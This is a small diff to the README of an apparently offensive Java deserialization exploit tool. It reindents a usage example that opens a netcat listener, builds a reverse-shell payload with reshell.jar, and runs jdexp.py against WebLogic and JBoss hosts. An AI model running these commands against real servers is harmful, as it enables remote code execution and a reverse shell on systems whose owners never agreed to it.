@@ -24,11 +24,11 @@ optional arguments:
 ```
 example:
 
-	▶ nc -vvlp 888
-	▶ java -jar reshell.jar [ReverseIP] 888 /tmp/payload
+▶ nc -vvlp 888
+▶ java -jar reshell.jar [ReverseIP] 888 /tmp/payload
 	
-	▶ python jdexp.py -weblogic [RemoteIP] 7001 /tmp/payload
-	▶ python jdexp.py -jboss [RemoteIP] 80 /tmp/payload
+▶ python jdexp.py -weblogic [RemoteIP] 7001 /tmp/payload
+▶ python jdexp.py -jboss [RemoteIP] 80 /tmp/payload
 ```
 
 ###下面的不用管了，jdexp.py可以完美代替。 
